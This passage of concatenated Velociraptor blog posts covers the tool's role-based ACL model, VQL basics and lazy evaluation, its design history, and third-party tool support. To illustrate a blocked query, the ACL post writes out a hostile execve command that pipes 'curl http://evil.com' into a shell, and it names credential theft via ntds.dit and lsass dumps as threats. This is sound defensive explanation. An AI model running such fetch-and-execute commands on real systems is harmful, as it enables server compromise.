I feel that having some magic box rewrite your query behind your back is suboptimal — people have to constantly run “explain” to try to figure out what the optimizer/planner is going to do to their query and then try to rewrite their query in non-obvious ways to provide hints to the optimizer to get it to do what they actually wanted it to do. This adds complexity to the language and makes it more difficult to use.

In VQL, if you wanted more performance, you can do it by structuring your query — Velociraptor is not going to second guess what you wanted to do.

Additionally, extra performance may not always be what you want. If my goal was to hash the entire filesystem on an endpoint, I typically do not want the endpoint to use all its resources, because this may negatively impact the end user. For a machine with many cores, having a single core hash every file for a few hours is much less impactful or noticeable than all cores saturating, even for a short time.

For these reasons parallelism in VQL is opt in — users have to structure their query to take advantage of it. The language remains simple and easy to use with a predictable model for how it works.

To play with this feature yourself, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at [https://www.velocidex.com/training/](https://www.velocidex.com/training/).

---END OF FILE---

======
FILE: /content/blog/2020/2020-03-29-velociraptors-acl-model-7f497575daee/_index.md
======
---
title: Velociraptor’s ACL model
description: Paleontologists working together…
date: '2020-03-29T00:38:44.349Z'
categories: []
keywords: []
---

Velociraptor is a very powerful tool with a great deal of privileged access to many endpoints. Velociraptor clients typically run with System or root level access on endpoints, in order to have low level access to the operating system. It follows that administrators on Velociraptor also have privileged access to the entire domain as well — they are equivalent to domain administrators.

For small trusted teams of investigators this is probably fine, however as Velociraptor is being more widely deployed in enterprise environments it has become clear that we needed a more elaborate role based ACL model.

## What are the threats?

Thinking of the different ways Velociraptor may be abused can shed some light on what we are trying to protect and how to protect it. Suppose a malicious actor was able to compromise an account belonging to one of the Velociraptor deployment admins. What damage could they do?

### Viewing collected data

A malicious Velociraptor user can look at existing collected data, which might contain PII or security sensitive information. For example they might be able to inspect process execution log from any machine and determine further targets on the network.

### Collecting additional information from endpoints

The next level of threat is actual collection of new information. Some forensic information is very sensitive, and adversaries may actively collect it (for example copy out **ntds.dit** for [offline cracking](https://attack.mitre.org/techniques/T1003/) or dump out **lsass** memory for offline [credential recovery](https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php)). A legitimate investigator would rarely need to perform these actions, but collecting files and dumping memory are normal routine forensic artifacts that are typically collected in the course of an investigation.

Clearly being able to misuse these artifact collections is a significant threat.

### Writing new artifacts

Velociraptor’s unique power lies in its flexible query language (VQL). Being able to write new VQL allows adversaries to run arbitrary code on the endpoint. New VQL can invoke the execve() VQL plugin which shells out with arbitrary command line arguments.

While is it convenient and even required to allow the Velociraptor endpoint to invoke the shell with arbitrary arguments, in the wrong hand it clearly represents a significant risk.

### Running VQL on the server

Velociraptor’s flexibility also allows for running arbitrary VQL queries on the server itself. This is useful for both managing the server (for example adding labels to clients) as well as post processing results from previous collections (For example by running VQL queries in the notebook cells to further filter collected artifacts).

While server side VQL is extremely useful, in the wrong hands it can result in complete server compromise. Since VQL can invoke the execve() plugin, being able to run server side VQL is equivalent to server shell access.

## Role based access control (RBAC)

Thinking about the threats in the previous section helped us get an understanding of how roles can help mitigate these risks. What do we mean by role based ACLs? We would like to assign users different roles, which control the type of activity they do. In this way, we can limit the amount of damage each user can do and reduce the number of powerful user accounts.

For example, we can come up with the following roles:

1. **reader**: This role provides the ability to read previously collected results but does not allow the user to actually make any changes. Sometimes we give customer sysadmins this role to allow them to see what we are doing on their network, but without allowing them to actually collect any data.

1. **analyst**: The next level up is an analyst — they are able to read existing collected data and also run some server side VQL in order to do post processing of this data or annotate it. Analysts typically use the notebook or download collected data offline for post processing existing hunt data. Analysts may not actually start new collections or hunts themselves.

1. **investigator**: The investigator role is the same as the analyst but can actually initiate new hunts or flow collections.

1. **artifact_writer**: This role allows a user to create or modify new client side artifacts (They are not able to modify server side artifacts). This user typically has sufficient understanding and training in VQL to write flexible artifacts. Artifact writers are very powerful as they can easily write a malicious artifact and collect it on the endpoint. Therefore they are equivalent to domain admins on endpoints. You should restrict this role to very few people.

1. **administrator**: Like any system, Velociraptor needs an administrator which is all powerful. This account can run arbitrary VQL on the server, reconfigure the server etc. Hopefully, the need for a user to have administrator level access is greatly reduced by the RBAC system.

## Permissions

In the previous section we saw how roles can be assigned to users to create a reasonable division of work and limit the power of each user to their prescribed role. How are these actually implemented in Velociraptor though?

Velociraptor’s flexibility makes direct implementation of an RBAC challenging. Since Velociraptor is really just a VQL engine, it does different things depending on the query issued. For example, this server side query examines the results of a hunt:

```
 SELECT * FROM hunt_results(hunt_id=”H.1234")
```

It is a perfectly valid post processing query and should be allowed, even inside the notebook, by any analyst.

However the query

```
 SELECT * FROM execve(argv=[“bash”, “-c”, “curl http://evil.com | sh”])
```

Is clearly a malicious query and should be blocked from the notebook (It can result in server compromise).

Velociraptor solves this by introducing a permission system. Each VQL plugin requires the caller to possess a particular permission. For example, the execve() plugin required the EXECVE permission (i.e. being allowed to run arbitrary shell commands). If the user does not have the permission, the plugin fails with an error.

Let’s look at this example more closely. I will create a user called “analystbob” and assign them the **analyst** role:

![](../../img/1KzOsl3TZ2oztzDQF-c4APw.png)

Bob is allowed to view and edit notebooks using the GUI since Bob is an analyst. Let’s see Bob creating a new notebook

![](../../img/1Dri1UPuqRLnhmadSP5f-jQ.png)

Bob can even issue VQL queries for post processing and filtering of collected data. However, what happens if they try to issue the malicious VQL above within a VQL notebook cell?

![](../../img/1qOUD4kX7OGj9rlrM84y21A.png)

![](../../img/1AkJUHE0jH9m5ckmwxkG2aQ.png)

Bob’s query returned no rows since the execve() plugin refused to run without the EXECVE permission, which Bob lacks.

Let’s see Bob browsing the Virtual Filesystem of an endpoint

![](../../img/1QkdlX3Ubyb_eQhvDLnko5Q.png)

The rest of the GUI does not allow Bob to actually collect any new data — for example the VFS view does not allow collecting new directory listing or new files (but Bob can still navigate already collected directories).

If Bob wants to collect new artifacts or perform new hunts, he will need to ask **investigatoralice** who has the **investigator** role to actually collect those. Similarly, if Bob wants to modify or implement a new artifact they will need to ask the user **sue** who has the **artifact_writer** role to be able to add the artifacts for him (Once the artifact is added, Alice can now collect it — she just can’t add it herself).

### Artifact permissions

Some artifacts are more sensitive than others. For example, the **Windows.System.CmdShell** artifact implements the interactive shell feature. It allows arbitrary commands to be executed by the command shell on the endpoint — a very powerful artifact indeed.

![](../../img/1lX2toda0AOVf7VOrPkW_2w.png)

If we allowed an investigator role to run this artifact, they could easily escalate to System level access on the endpoint. Therefore we really should be limiting the permissions of users that are allowed to run this specific artifact.

![](../../img/1L4zxgkz0Mh4OevcR70ppBg.png)

The artifact definition itself specifies that this artifact requires the EXECVE permission. Let’s see what happens when **investigatoralice** attempt to collect that artifact.

![](../../img/1zDpPBEoNCb34H9Vql8dEBQ.png)

![](../../img/1RcGR69bUlWh58Vf8L23W_w.png)

Velociraptor refuses to schedule this artifact collection since alice does not have the execve permission (This is only available to administrators). Therefore only administrators can issue arbitrary commands on the endpoint.

Lets have a look at the available permissions (Permissions might evolve over time, but these are the defined permissions at this time)

![[https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto](https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto#L9)](../../img/1pbqvWfXG2Gtg-cBuWGYqVw.png)*[https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto](https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto#L9)*

## API Clients

We have previously shown how Velociraptor can be accessed through the API. The Velociraptor API is very simple — it simply offers a single gRPC method called **Query** which allows clients to run arbitrary VQL queries on the server.

Previously there was no access controls on the VQL issue by the API client, so an API client could run any VQL queries. Typically API clients are used to automate post processing of hunts and flows and so they rarely need more sophisticated permissions.

It is now possible (even required) to limit the access of API clients by assigning them specific permissions depending on the queries they typically need to run.

For example, suppose I have a python program which watches for server events so it can post process them. The program will run the query

```
SELECT * FROM watch_monitoring(artifact=’System.Flow.Completion’)
```

This program only needs the following permissions

1. The **any_query** permission is required to issue any VQL queries

1. The **collect_server** permission is required to collect any information from the server itself (i.e. about server state).

1. The **read_results** permission is required to see any endpoint data already collected

First I will create an API config file for this program, then grant the API client the minimum required permissions.

```sh
velociraptor config api_client api_config.yaml --name PythonPostProcess
velociraptor acl grant PythonPostProcess ‘{“any_query”:true,”collect_server”:true,”read_results”:true}’
```

Note the **acl grant** command grants an ACL policy object to the specific username or API keys name. The policy object is simply a JSON encoded object with the required permission set to true.

We can now use the [pyvelociraptor](https://github.com/Velocidex/pyvelociraptor) Python program to connect to the API and run the query.

![](../../img/155h1dEafVJ9hnG7gdgF3hQ.png)

Imagine if this API key was compromised and the attackers attempted to run the shell command on the server through the API. The server logs show the API call being made and then immediately a permission denied due to EXECVE permission missing. The power of the key is limited by the restricted permissions.

![](../../img/1G6ut8fEGCu3AfbxaiMHYVg.png)

## Conclusions

Velociraptor role based access controls allows for greater division of labor within the Velociraptor DFIR team. The roles limit the level of damage that can be done with a user account compromise.

However, we must remember still that Velociraptor is still a very privileged program with a lot of access. It is inherently difficult to predict how privilege can be escalated — after all Velociraptor collects highly sensitive forensic artifacts whose disclosure can sometime result in PII or security incidents. It is still a good idea to limit access to the Velociraptor GUI to the minimum number of people that need it, and ensure the entire team is trained at how to wield Velociraptor effectively.

---END OF FILE---

======
FILE: /content/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/_index.md
======
---
title: The Velociraptor Query Language Pt 1
description: Asking questions — Getting answers!
date: '2020-06-14T00:38:44.349Z'
tags:
- VQL
- Low level
categories: []
keywords: []
---

![](../../img/14hy_vlttNoFFf-sr_Ei0tw.jpeg)

Velociraptor’s query language is central to the operation of Velociraptor. We find it being used in querying endpoints, collecting forensic artifacts and endpoint state and even in post processing data on the server.

{{% notice note %}}
Velociraptor is ultimately just a VQL query evaluation engine!
{{% /notice %}}

Why should you know more about VQL? Users do not actually need to know VQL to simply collect DFIR artifacts from endpoints, hunt for malware or remediate an infection. The Velociraptor GUI is powerful and provides expert DFIR knowledge at the tip of your fingerprints through built in and community contributed artifact definitions.

However being proficient in VQL will allow you to be able to write custom artifacts, post process data and adapt quickly to changing requirements during a fluid incident response exercise. You will also be able to understand, modify or adapt existing artifacts to your changing needs or to handle new evidence sources.

This is the first of a series of articles about the VQL query language. I hope this series will inspire you to develop and contribute new artifacts to this open source project — to the benefit of all members of the community.

### Why a query language?

Before we start, let's discuss why would we want a query language in an endpoint visibility and monitoring tool, such as Velociraptor.

In practice, the DFIR process is very fluid — sometimes we don't know in advance what we would encounter. We need a way to rapidly and flexibly deploy new hunting techniques and algorithms in order to responds to the dynamic nature of IR.

There are a number of other DFIR tools that do not feature a rich query language — but they all provide some method of dynamically adding code to the endpoint. For example [GRR](https://github.com/google/grr) supports “Python Hacks” to run arbitrary code at the endpoint, [Tanium](https://www.tanium.com/) supports running scripts and[ Carbon Black ](https://www.carbonblack.com/)allows running arbitrary commands using an API. All these methods cater for dynamic and flexible response.

[OSQuery](https://osquery.io/) was the first tool to offer SQL as a query language for accessing endpoint state. This is really powerful and is probably the most similar tool to Velociraptor’s VQL. So in this article we will often highlight similarities and differences between Velociraptor’s VQL and OSQuery’s SQL.

### Velociraptor Notebooks

In the articles in this series, we will be working with the Velociraptor notebook. The notebook is a way to collaborate with many investigators in the course of a DFIR investigation using a shared document consisting of cells (think of it like a Google docs for DFIR!).

If you want to follow along this article, you should install the Velociraptor frontend locally (simply generate a simple local config using velociraptor config generate -i and start the frontend using velociraptor.exe --config server.config.yaml frontend -v.

Start a new notebook by selecting the notebook in the sidebar then add a new notebook. Provide a title and description and then add a new VQL cell.

![](../../img/1IaE_YYFXGqDIOXuxZa8dWQ.png)

Notebooks consists of a series of **Cells**. There are a number of types of cells but the most common are **Markdown** Cells and **VQL** cells. VQL cells allow one to run arbitrary VQL directly within the notebook, and view the results in a table.

When you create a new notebook, the first cell will be of type markdown. You can add a VQL cell below that by simply selecting Add VQL cell from the toolbar.

![](../../img/1bqFDmsEFrvkpE8BGmMi2Tg.png)

A VQL cell allows one to simply write VQL queries into the notebook. Note that VQL queries in the notebook are actually running on the server itself. It is therefore possible to control and automate the server using VQL (we will see this in a later article).

For now simply write the following query and click the save icon.

```vql
SELECT * FROM info()
```

![](../../img/1VIwIVaEUGr16yQlEUy-K9A.png)

When you finish writing your VQL query, click the “Save” button to update the notebook cell and recalculate the table.

You have just written your first VQL query!

One important thing to note is that the output of a query is always a table. The GUI will render the table in the VQL cell. The table will always return a sequence of rows, each row being a simple collection of columns. You can think of a row as simply a python dictionary with keys being the column names and values being arbitrary objects.

### VQL Basics

VQL was designed to be easy to use and simple to understand. It is also based on SQL but does not support more complex SQL constructs like joins. The basic statement in VQL looks like this:

![](../../img/1lkLMfTJJDPVUtw1fsBPUEQ.png)

VQL queries start with the SELECT keyword, and are then followed by a list of “Column Selectors” which specify the columns that will be emitted. A VQL query can also have a WHERE clause — representing a filter which the row must pass before it is emitted.

One of the biggest differences between VQL and SQL is the use of parameters given to plugins. SQL was designed to operate on static data tables, however, in VQL, data sources are not static — they are actually plugins which generate rows when called (for example *pslist()* is a plugin which returns one process per row).

Since plugins run code, it makes sense that they would accept arguments just like functions. Therefore in VQL plugins receive keyword arguments. VQL does not support positional arguments — all arguments are named. In the GUI pressing “?” inside a plugin will suggest all the keywords the plugin accepts so it is really easy to find the names for a plugin’s arguments.

![](../../img/1LhnuM1rFwDIhJelj4wN2AA.png)

VQL Plugins generate rows, but what exactly is a row? Unlike SQL which deals with simple data types, a VQL row can be thought of as a mapping (i.e. python dictionary or a JSON object) where keys are the column names, and values can take on simple types like integers, strings, as well as complex types like other objects, timestamps etc.

You can see the raw data for each row in the table by clicking the “Show Raw JSON” button (Looks like binoculars) in the table GUI. For example, for the above query we can see the raw data as below.

![](../../img/1qCKk06PkMDt79-X9Vu8K8Q.png)

In our case the **info()** plugin generated a single row with information about the running platform. The raw data consists of a list of JSON objects — each object represents a single row. Rows have column names and each column may contain different data.

### Lazy VQL

One interesting aspect of VQL is lazy evaluation. Since VQL functions can be expensive or have side effects it is important to understand how they are evaluated. In the following discussion we will illustrate this by use of the **log()** VQL function — this function simply emits a logging message (you can think of it as the VQL equivalent of **print**).

Let us modify the above query to simply log a simple message “I ran!”

![](../../img/1-k1KllnlrUkKBgiLO3FvvQ.png)

The GUI renders query logs in red under the table. As we can see the log() function evaluated to **true** and a side effect was logging a message.

It is best to understand how lazy evaluation works by looking at examples. Consider the following example:

![](../../img/10XsMrQaOdDrFlzUH-LPjqw.png)

In this query we add another column to the output of the info() plugin called “Log” which contains the **log() **function. We then use this column in the WHERE clause. Since the log() function always returns true, the row will pass the filter and be emitted, as well as a log message printed.

What happens however, if the row is filtered out? Let us change this query to be filtered only if the OS is windows (this query is running on Linux).

![](../../img/1-k3j8cbSXKjB-RLQcBgYew.png)

Since no rows are emitted, the log() function is never evaluated! Therefore we got no logging message. Notice how the log() function is evaluated lazily — since the output is not needed since the row is filtered out.

Let’s now change the query to consider the Log column in the WHERE clause

![](../../img/1d0mjp1CUCjGbwuj8NB25Lw.png)

Because the WHERE clause needs to evaluate the column “Log” the log() function will be evaluated first — even though the row is ultimately eliminated, we still receive a log message!

VQL evaluates a logical expression in a lazy manner — the left hand side of the AND clause is evaluated, and if true the right hand side is evaluated.

Let’s swap the order of the AND clause

![](../../img/12NQXdVa7w_OaecjNXpzm2Q.png)

This time the row is eliminated by the left hand condition (OS = “Windows”) and VQL does not need to evaluate the Log column at all! Hence we get no logging message.

### Using laziness in practice

The previous discussion was rather theoretical but how would you use this behavior in reality? When we write VQL it is important to bear in mind how expensive we believe each operation would be.

For example consider the **hash()** function which calculates a hash of a file when evaluated. Suppose we were looking for a particular file with a known hash in the **/usr/bin** directory.

![](../../img/1V-alj2p3P3hr5HPYYxM1wg.png)

This query is rather expensive — we have to hash every single file in the directory and compare that to our malicious hash (In VQL **=~** is the regex match operator). If the directory is large, or we search through many directories, this can take many minutes!

Instead we can leverage the lazy evaluation property to make the query far more efficient by considering other attributes of the file which are quicker to calculate

![](../../img/13_nBDC6EonDZuLmZZXvzgg.png)

This revised query is almost instant! We only really hash those files whose size is exactly 499 bytes and never hash any of the other files which are not the ones we are looking for!

We can now encode this VQL query in an artifact, and launch it as a hunt on our entire deployment. This low cost, almost instant hunt is well suited for very wide deployment without fear of adverse effects on endpoint performance.

## Conclusion

VQL is a very powerful way of searching for specific indicators on the end point. A good working knowledge of VQL pays dividends to the DFIR hunter. This first part in our series of articles about VQL internals hopes to provide you with the tools and confidence to forge your own VQL queries. In the next article we explore VQL’s control structures such as **if()**, **foreach()** and **switch()**.

If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at [https://www.velocidex.com/training/](https://www.velocidex.com/training/).

---END OF FILE---

======
FILE: /content/blog/2020/2020-04-16-velociraptor-e48a47e0317d/_index.md
======
---
title: Velociraptor
description: Digging deeper — an introduction
date: '2020-04-16T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/0FQfmIrDiAxOjGNSO.jpg)

This is an introductory article explaining the rationale behind Velociraptor’s design and particularly how Velociraptor evolved with some historical context compared with other DFIR tooling. We took a lot of inspiration and learned many lessons by using other great tools, and Velociraptor is our attempt at pushing the field forward.

Digital forensics is primarily focused on answering questions. Most practitioners limit their cases around high level questions, such as did the user access a particular file? Was malware run on the user’s workstation? Did an attacker crack an account?

Over the years, DFIR practitioners have developed and refined methodologies for answering such questions. For example, by examining the timestamps stored in the NTFS filesystem we are able to build a timeline tracing an intruders path through the network. These methodologies are often encoded informally in practitioners’ experience and training. Wouldn’t it be great to have a way to formally document and encode these methodologies?

In many digital evidence based cases, time is of the essence. The forensic practitioner is looking to answer questions quickly and efficiently, since the amount and size of digital evidence is increasing with every generation of new computing devices. We now see the emergence of triage techniques to quickly classify a machine as worthy of further forensic analysis. When triaging a system, the practitioner has to be surgical in their approach — examining specific artifacts before even acquiring the hard disk or memory.

Triaging is particularly prevalent in enterprise incident response. In this scenario it is rare for legal prosecution to take place, instead the enterprise is interested in quickly containing the incident and learning of possible impacts. As part of this analysis, the practitioner may need to triage many thousands of machines to find those machines who were compromised, avoiding the acquisition of bit-for-bit forensically sound images.

## The rise of the endpoint DFIR agent

This transition from traditional forensic techniques to highly scalable distributed analysis has resulted in multiple offering of endpoint agents. An agent is specialized software running on enterprise endpoints providing forensic analysis and telemetry to central servers. This architectures enables detection of attackers from different endpoints as they traverse through the network and provides a more distributed detection coverage for more assets simultaneously.

One of the first notable endpoint agents was [GRR](https://github.com/google/grr), a Google internal project open sourced around 2012. GRR is an agent installed on many endpoints controlled by a central server. The agent is able to perform some low level forensic analysis by incorporating other open source tools such as the [Sleuthkit](https://www.sleuthkit.org/) and [The Rekall Memory forensic suite](http://www.rekall-forensic.com/). The GRR framework was one of the first to offer the concept of hunting — actively seeking forensic anomalies on many endpoints at the same time. For the first time, analysts could pose a question — such as “Which endpoints contain this registry key”, to thousands of endpoints at once, and receive an answer within hours.

Hunting is particularly useful for rapid triaging — we can focus our attention only on those machines which show potential signs of compromise. GRR also provides interactive remote access to the endpoint, allowing for user inspection of the endpoint (such as interactively examining files, directories and registry keys).

As useful as GRR’s approach was at the time, there were some shortfalls, mainly around lack of flexibility and limited scale and performance. GRR features are built into the agent making it difficult to rapidly push new code updates or new capabilities in response to changing needs. It is also difficult to control the amount of data transferred from the endpoint which often ends up being much too detailed than necessary, leading to performance issues on the server.

The next breakthrough in the field was the release of [Facebook’s OSQuery](https://osquery.io/). This revolutionary tool allows one to query the endpoints using a SQL like syntax query. By querying the endpoint, it is possible to adapt the results sent, apply arbitrary filtering and combine different modules in new creative ways. OSQuery’s approach proved to be very flexible in the rapidly evolving stages of incident response, where users need to modify their queries rapidly in response to emerging needs.

## Introducing Velociraptor

Learning from these early projects, [Velociraptor](https://github.com/Velocidex/velociraptor) was released in 2019. Similar to GRR, Velociraptor also allows for hunting across many thousands of machines. Inspired by OSQuery, Velociraptor implements a new query language dubbed VQL (Velociraptor Query Language) which is similar to SQL but extends the query language in a more powerful way. Velociraptor also emphasizes ease of installation and very low latency — typically collecting artifacts from thousands of endpoints in a matter of seconds.

![](../../img/0PCWOhCGjc7eeNXig)

**Figure 1** above shows an overview of the Velociraptor architecture. The Velociraptor server maintains communications with the endpoint agents (called Clients) for command and control. The web based administration user interface is used to task individual clients, run hunts and collect data.

Ultimately, Velociraptor agents are simply VQL engines — all tasks to the agent are simply VQL queries that the engine executes. VQL queries, just like database queries, result in a table, with columns (as dictated by the query) and multiple rows. The agent will execute the query, and send back the results to the server which simply stores them as files. This approach means the server is not really processing the results other than just storing them in files. Therefore the load on the server is minimal allowing for vastly scalable performance.

## Velociraptor artifacts

Writing free-form queries is a powerful tool, but from a user experience perspective, it is not ideal. Users will need to remember potentially complex queries. Velociraptor solves this by implementing “[**Artifacts](https://www.velocidex.com/docs/artifacts/)**”. An artifact is a text file written in YAML which encapsulates the VQL, adds some human readable descriptions and provides some parameters allowing users to customize the operation of the artifact to some extent.

As an example of this process, we consider the [Windows Scheduled Tasks](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page). These tasks are often added by attackers as a way of gaining persistence and a backdoor to a compromised system (See Att&ck Matrix [T1053](https://attack.mitre.org/techniques/T1053/)). Velociraptor can collect and analyse these tasks if provided with the appropriate VQL query. By writing the query into an artifact we make it possible for other users to simply re-use our VQL.

![](../../img/0ZUoUfr0Mk8LOSn_Z)

**Figure 2** shows the **Windows.System.TaskScheduler** artifact as viewed in the GUI. The artifact contains some user readable background information, parameters and the VQL source. As **Figure 3** below shows, in the GUI, one simply needs to search for the scheduled tasks artifact, select it and collect it from the endpoint.

![](../../img/000bPLfksaHxbLxxp)

As soon as we issue the collection request, the client will run the VQL query, and send the result to the server within seconds. If the agent is not online at the time of the query, the task will be queued on the server until the endpoint comes back online, at which time the artifact will be collected immediately.

![](../../img/027ICJSb6akkcUGoL)

**Figure 4** shows the result of this collection. We see the agent took 5 seconds to upload the 180 scheduled task XML files, which took a total of 5.7mb. We can click the “**Prepare Download**” button now to prepare a zip file containing these files for export. We can then download the Zip file through the GUI and store it as evidence as required.

![](../../img/08NHoafuoVUvkN5i1)

**Figure 5** shows the results from this artifact. The VQL query also instructed the endpoint to parse the XML files on the endpoint and extract the launched command directly. It is now possible to quickly triage all the scheduled tasks looking for unusual or suspicious tasks. The exported Zip file will also contain the CSV files produced by this analysis and can be processed using any tool that supports CSV formatted data (e.g. Excel, MySQL or Elastic through Logstash).

## Hunting with Velociraptor

Continuing our example of scheduled tasks, we now wish to hunt for these across the entire enterprise. This captures the state of the deployment at a point in time when the hunt was collected and allows us to go back and see which new scheduled tasks appeared at a later point in time.

Hunting is simply a way to collect the same artifact from many machines at the same time. The GUI simply packages the results from these collections into a single exported file.

![](../../img/099cPv4K_gBkZ2-CL)

**Figure 7** shows a hunt created to collect the **Windows.System.TaskScheduler** artifact. We can see the total number of clients scheduled and completed and that the hunt will expire in one week. If new machines appear within this time, they will also have that artifact collected. Finally we can prepare an export zip file for download that contains all the client’s collected artifacts.

## Forensic analysis on the endpoint

To be really effective, Velociraptor implements many forensic capabilities directly on the endpoint. This allows for writing artifacts that can leverage this analysis, either in a surgical way — identifying directly the relevant data, or in order to enrich the results by automatically providing more context to the analyst. In this section we examine some of these common use cases and see how they can be leveraged through use of artifacts.

## Searching for files

A common task for analysts is to search for particular filenames. For example, in a drive by download or phishing email case, we already know in advance the name of the dropped file and we simply want to know if the file exists on any of our endpoints.

The **Windows.Search.FileFinder** artifact is designed to search for various files by filename. **Figure 8** below illustrates the parameters that can be used to customize the collection. For a typical drive-by download, we might want to search for all binaries downloaded recently within the user’s home directories. We can also collect matching files centrally to further analyse those binaries. The artifact also allows us to filter by keywords appearing within file contents.

![](../../img/0lxWTbRpxhE7iGO51)

![](../../img/0a7nLLP77dcFHcjPl)

Searching for files is a very common operation which covers many of the common use cases, but it is limited to finding files that are not currently deleted. Velociraptor also includes a complete NTFS filesystem parser available through a VQL plugin. This allows us to extract low level information from every MFT entry.

![](../../img/0OzrfX5m7eKMFw5xQ)

**Figure 10 **shows a sample of this output. We can see details like the **FILE_NAME** timestamps, as well as the **STANDARD_INFORMATION** stream timestamps (useful for detecting time stomping).

![](../../img/0hLC9MjRTfcS3MmyZ)

While the **Windows.NTFS.MFT** artifact dumps all MFT entries from the endpoint, we can make this more surgical and specifically search for deleted executables. To do this we would need to modify the VQL query to add an additional filter.

Modifying or customizing an artifact is easy to do through the GUI. Simply search for the artifact in the “**View Artifacts**” screen, and then click the **“Modify Artifact”** button to bring up an editor allowing the YAML to be directly edited (Note that all customized artifacts, automatically receive the prefix “**Custom**” in their name setting them apart from curated artifacts).

![](../../img/0lVGMD5SpsDzt9beg)

In the figure above we added the condition **“WHERE FileName =~ ‘.exe$’ AND NOT InUse”** to restrict output only to deleted executables. We now select this customized version and collect it on the endpoint as before. Since we have filtered only those executables which are deleted in this query, the result set is much smaller and somewhat quicker to calculate. **Figure 11** below shows a single binary was found on our test system still recoverable in unused MFT entry.

![](../../img/0PVnSNZXUSeVkdoLy)

**Figure 11** shows an MFT entry for a binary that had been removed from disk. If we are lucky we can attempt to recover the deleted file using the **Windows.NTFS.Recover **artifact. This artifact simply dumps out all the attribute streams from the specified MFT entry (including the **$DATA** attribute) and uploads them to the server. **Figure 12** below shows how we can select to collect this artifact, and specify the MFT entry reported in the previous collection as a parameter to the artifact.

![](../../img/0lhzQN2pP4LOM-rqD)

![](../../img/0CcdK7p9p5vWog0ms)

**Figure 13** shows the output from the **Windows.NTFS.Recover **artifact, showing the **$DATA **stream was correctly recovered as verified by its hash.

The previous example demonstrates how having advanced forensic analysis capabilities is valuable during endpoint monitoring. The example of a drive by download required us confirming if a particular executable is present on any of our endpoints. We started off by performing a simple filename search for executables. But realizing this will only yield currently existing files, we move onto deep level NTFS analysis dumping all MFT entry information. We then modified the VQL query to restrict the output to only the subset of results of interest in our case.

This modified query can now run as a hunt on the entire fleet to determine which executables have recently been deleted anywhere, which would confirm if the malware was run on other machines we are not aware of. We can then potentially use NTFS recovery techniques to recover the binary for further analysis. Without the flexibility of the powerful Velociraptor Query Language it would be difficult to adapt to such a fluid and rapidly developing incident.

## Conclusions

Velociraptor includes many other low level analysis modules, such as parsing prefetch files, raw registry access (for [`AMCache` ](https://www.andreafortuna.org/2017/10/16/amcache-and-shimcache-in-forensic-analysis/)analysis), [ESE database](https://en.wikipedia.org/wiki/Extensible_Storage_Engine) parser (facilitating [SRUM database forensics](https://www.sans.org/cyber-security-summit/archives/file/summit_archive_1492184583.pdf) and Internet Explorer history analysis), [SQLite](https://www.sqlite.org/) parsers (for Chrome and Firefox history) and much more.

The true power of Velociraptor is in combining these low level modules with other VQL queries to further enrich the output or narrow down queries making them more surgical and reducing the amount of false positives. This more targeted approach is critical when hunting at scale in order to reduce the amount of data collected and assist the operator in focusing on the truly important evidence quickly and efficiently.

The type of analysis performed is driven by a flexible VQL query, written into an artifact by the user. This unprecedented level of flexibility and scale in a forensic tool allows for flexible and novel response and collection. It is really only limited by the imagination of the user.

We opened this article by imagining a world where experienced forensic practitioners could transfer and encode their knowledge and experience into actionable artifacts. Velociraptor’s artifacts help to bring this vision to life — allowing experienced users to encode their workflow in VQL artifacts opens these techniques up to be used by other practitioners in a more consistent and automated fashion. We hope to inspire a vibrant community of VQL Artifact authors to facilitate exchange of experience, techniques and approaches between practitioners and researchers alike.

Velociraptor is available under an open source license on [GitHub](https://github.com/Velocidex/velociraptor). You can download the latest Velociraptor release and use it immediately, or clone the source repository and contribute to the project. You can also contribute VQL snippets or artifacts directly to the project in order to share commonly used artifacts with the larger community.

{{% notice tip %}}
About the author: Mike Cohen is a digital forensic researcher and senior software engineer. He has supported leading open-source DFIR projects including as a core developer of Volatility and lead developer of both Rekall and Google’s Grr Rapid Response. Mike has founded Velocidex in 2018 after working at Google for the previous 8 years in developing cutting edge DFIR tools. Velocidex is the company behind the Velociraptor open source endpoint visibility tool.
{{% /notice %}}

---END OF FILE---

======
FILE: /content/blog/2020/2020-07-13-velociraptor-in-the-tool-age-d896dfe71b9/_index.md
======
---
title: Velociraptor in the tool age
description: Velociraptor’s integration with third party tools
date: '2020-07-13T00:38:44.349Z'
tags:
- Internals
- Tools
categories: []
keywords: []
---

![[People vector created by `brgfx`](https://www.freepik.com/free-photos-vectors/people)— [www.freepik.com](http://www.freepik.com)](https://cdn-images-1.medium.com/max/2560/1*N7EiK5rrkbiWNF47_ifOKQ.png)*[People vector created by `brgfx` ](https://www.freepik.com/free-photos-vectors/people)— [www.freepik.com](http://www.freepik.com)*

Velociraptor is a powerful endpoint visibility tool. It has plugins and parsers for many file formats, such as raw NTFS access, raw registry hive, prefetch files etc.

However, as most DFIR professionals know, there are so many tools out there that we would love to use in our IR work. One of the strengths of Velociraptor is its flexibility afforded by the use of the[ Velociraptor Query Language (VQL).](../../img/the-velociraptor-query-language-pt-1-d721bff100bf)

We have written before on how VQL can be extended by use of short
[PowerShell scripts]({{% ref "/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/" %}}),
by including these scripts directly in the Artifact definitions. This
is a great way to extend the functionality provided by VQL, but what
if we wanted to launch a completely separate binary on the endpoint,
or a larger powershell module? How can Velociraptor facilitate the
distribution, coordination and collection of tool output from
thousands of endpoints efficiently and quickly?

Since[ release 0.4.6](https://github.com/Velocidex/velociraptor/releases), Velociraptor supports including external tools directly in the artifact definition. This makes it easier than ever before to use external tools in your artifacts transparently — Velociraptor will ensure the tool is downloaded to the endpoint if needed and is available for use in your VQL.

